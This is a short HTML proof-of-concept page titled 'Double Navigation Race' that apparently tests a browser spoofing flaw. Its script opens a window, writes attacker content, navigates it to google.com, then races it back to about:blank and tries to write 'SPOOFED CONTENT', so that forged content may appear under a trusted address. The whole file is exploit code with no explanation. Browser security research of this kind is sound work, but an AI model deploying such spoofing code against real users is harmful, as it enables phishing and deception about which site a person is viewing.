<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PoC C - Double Navigation</title>
</head>
<body>

<h2>Double Navigation Race</h2>
<button onclick="run()">Run</button>

<script>
const TARGET = "https://www.google.com";

function run() {
  const w = window.open("about:blank");

  setTimeout(() => {
    w.document.write("<h1>ATTACKER CONTENT</h1>");

    w.location.href = TARGET;

    setTimeout(() => {
      w.location.href = "about:blank";

      setTimeout(() => {
        try {
          w.document.write("<h1>SPOOFED CONTENT</h1>");
        } catch(e){}
      }, 10);

    }, 1);

  }, 100);
}
</script>

</body>
</html>
